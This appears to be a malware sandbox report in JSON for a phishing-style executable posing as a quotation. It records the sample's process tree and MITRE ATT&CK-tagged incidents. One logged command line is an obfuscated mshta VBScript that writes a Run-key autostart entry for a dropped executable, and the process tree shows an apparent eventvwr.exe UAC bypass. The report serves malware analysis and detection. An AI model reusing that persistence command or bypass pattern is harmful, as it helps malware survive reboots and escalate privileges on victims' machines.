@@ -1,0 +1,188 @@
+{
+ "Name": "QUOATATION#11019_RFQ_HANGZHOUS_ZHONGNIUMIMPORT_EXPORT_CO.exe",
+ "Md5": "e1faf42dbdae49af9f45473d99f849d8",
+ "UUID": "ccf065ea-d199-4845-ba2e-991f417afcc9",
+ "Processes": [
+  {
+   "OID": "5c46e75f2a3f8e41d09f06fa",
+   "ProcessID": 3088,
+   "ParentPID": 116,
+   "CommandLine": "\"C:\\Users\\admin\\AppData\\Local\\Temp\\QUOATATION#11019_RFQ_HANGZHOUS_ZHONGNIUMIMPORT_EXPORT_CO.exe\" ",
+   "Image": "C:\\Users\\admin\\AppData\\Local\\Temp\\QUOATATION#11019_RFQ_HANGZHOUS_ZHONGNIUMIMPORT_EXPORT_CO.exe",
+   "ProcessType": "Main process",
+   "CreationTimestamp": 1548150623222
+  },
+  {
+   "OID": "5c46e7602a3f8e41d09f0dce",
+   "ProcessID": 3004,
+   "ParentPID": 3088,
+   "CommandLine": "\"C:\\Windows\\System32\\mshta.exe\" vbscript:Execute(\" str1 = \"\"WScript.Shell\"\" : str2 = \"\"Set WshShell = CrXXteObject(str1)\"\" : str2 = Replace(str2,\"\"XX\"\",\"\"ea\"\") : execute str2 : myKey = \"\"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\cellina\"\" : WshShell.RegWrite myKey,\"\"C:\\Users\\admin\\AppData\\Local\\Temp\\henriett.exe\"\",\"\"REG_SZ\"\" : window.close\")",
+   "Image": "C:\\Windows\\System32\\mshta.exe",
+   "ProcessType": "Child process",
+   "CreationTimestamp": 1548150623659
+  },
+  {
+   "OID": "5c46e7602a3f8e41d09f12a4",
+   "ProcessID": 1744,
+   "ParentPID": 3088,
+   "CommandLine": "\"C:\\Users\\admin\\AppData\\Local\\Temp\\henriett.exe\" ",
+   "Image": "C:\\Users\\admin\\AppData\\Local\\Temp\\henriett.exe",
+   "ProcessType": "Child process",
+   "CreationTimestamp": 1548150624081
+  },
+  {
+   "OID": "5c46e7612a3f8e41d09f185d",
+   "ProcessID": 2348,
+   "ParentPID": 1744,
+   "CommandLine": "\"C:\\Windows\\System32\\eventvwr.exe\" ",
+   "Image": "C:\\Windows\\System32\\eventvwr.exe",
+   "ProcessType": "Child process",
+   "CreationTimestamp": 1548150624909
+  },
+  {
+   "OID": "5c46e7612a3f8e41d09f185e",
+   "ProcessID": 2656,
+   "ParentPID": 3088,
+   "CommandLine": "\"C:\\Program Files\\Microsoft Office\\Office14\\EXCEL.EXE\" /dde",
+   "Image": "C:\\Program Files\\Microsoft Office\\Office14\\EXCEL.EXE",
+   "ProcessType": "Child process",
+   "CreationTimestamp": 1548150624941
+  },
+  {
+   "OID": "5c46e7622a3f8e41d09f224f",
+   "ProcessID": 3784,
+   "ParentPID": 1744,
+   "CommandLine": "\"C:\\Windows\\System32\\eventvwr.exe\" ",
+   "Image": "C:\\Windows\\System32\\eventvwr.exe",
+   "ProcessType": "Child process",
+   "CreationTimestamp": 1548150626409
+  },
+  {
+   "OID": "5c46e7632a3f8e41d09f25e5",
+   "ProcessID": 3032,
+   "ParentPID": 3784,
+   "CommandLine": "\"C:\\Users\\admin\\AppData\\Local\\Temp\\henriett.exe\" ",
+   "Image": "C:\\Users\\admin\\AppData\\Local\\Temp\\henriett.exe",
+   "ProcessType": "Child process",
+   "CreationTimestamp": 1548150626706
+  }
+ ],
+ "Incidents": [
+  {
+   "ProcessOID": "5c46e7632a3f8e41d09f25e5",
+   "ThreatLevel": 1,
+   "MitreAttacks": []
+  },
+  {
+   "ProcessOID": "5c46e7632a3f8e41d09f25e5",
+   "ThreatLevel": 2,
+   "MitreAttacks": []
+  },
+  {
+   "ProcessOID": "5c46e7632a3f8e41d09f25e5",
+   "ThreatLevel": 1,
+   "MitreAttacks": []
+  },
+  {
+   "ProcessOID": "5c46e7642a3f8e41d09f2d30",
+   "ThreatLevel": 2,
+   "MitreAttacks": [
+    "T1053"
+   ]
+  },
+  {
+   "ProcessOID": "5c46e7632a3f8e41d09f25e5",
+   "ThreatLevel": 1,
+   "MitreAttacks": [
+    "T1065"
+   ]
+  },
+  {
+   "ProcessOID": "5c46e7632a3f8e41d09f25e5",
+   "ThreatLevel": 2,
+   "MitreAttacks": []
+  },
+  {
+   "ProcessOID": "5c46e7632a3f8e41d09f25e5",
+   "ThreatLevel": 1,
+   "MitreAttacks": [
+    "T1042"
+   ]
+  },
+  {
+   "ProcessOID": "5c46e7632a3f8e41d09f25e5",
+   "ThreatLevel": 2,
+   "MitreAttacks": [
+    "T1088"
+   ]
+  },
+  {
+   "ProcessOID": "5c46e7632a3f8e41d09f25e5",
+   "ThreatLevel": 2,
+   "MitreAttacks": []
+  },
+  {
+   "ProcessOID": "5c46e7612a3f8e41d09f185e",
+   "ThreatLevel": 0,
+   "MitreAttacks": [
+    "T1012"
+   ]
+  },
+  {
+   "ProcessOID": "5c46e75f2a3f8e41d09f06fa",
+   "ThreatLevel": 1,
+   "MitreAttacks": []
+  },
+  {
+   "ProcessOID": "5c46e7602a3f8e41d09f12a4",
+   "ThreatLevel": 1,
+   "MitreAttacks": [
+    "T1042"
+   ]
+  },
+  {
+   "ProcessOID": "5c46e7602a3f8e41d09f12a4",
+   "ThreatLevel": 2,
+   "MitreAttacks": [
+    "T1088"
+   ]
+  },
+  {
+   "ProcessOID": "5c46e7602a3f8e41d09f12a4",
+   "ThreatLevel": 2,
+   "MitreAttacks": []
+  },
+  {
+   "ProcessOID": "5c46e7602a3f8e41d09f12a4",
+   "ThreatLevel": 2,
+   "MitreAttacks": []
+  },
+  {
+   "ProcessOID": "5c46e7602a3f8e41d09f0dce",
+   "ThreatLevel": 2,
+   "MitreAttacks": [
+    "T1060"
+   ]
+  },
+  {
+   "ProcessOID": "5c46e7602a3f8e41d09f0dce",
+   "ThreatLevel": 0,
+   "MitreAttacks": [
+    "T1012"
+   ]
+  },
+  {
+   "ProcessOID": "5c46e75f2a3f8e41d09f06fa",
+   "ThreatLevel": 1,
+   "MitreAttacks": []
+  },
+  {
+   "ProcessOID": "5c46e75f2a3f8e41d09f06fa",
+   "ThreatLevel": 1,
+   "MitreAttacks": [
+    "T1170",
+    "T1064"
+   ]
+  }
+ ]
+}
